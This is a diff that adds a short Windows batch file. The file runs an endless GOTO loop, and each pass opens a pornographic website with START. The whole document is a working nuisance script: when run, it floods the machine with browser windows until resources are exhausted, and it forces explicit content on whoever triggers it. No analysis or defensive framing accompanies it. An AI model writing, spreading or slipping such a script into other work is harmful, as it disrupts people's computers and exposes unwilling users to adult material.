@@ -1,0 +1,7 @@
+﻿@echo off
+cls
+@echo off
+:funcao
+START www.sambaporno.com
+CLS
+GOTO funcao
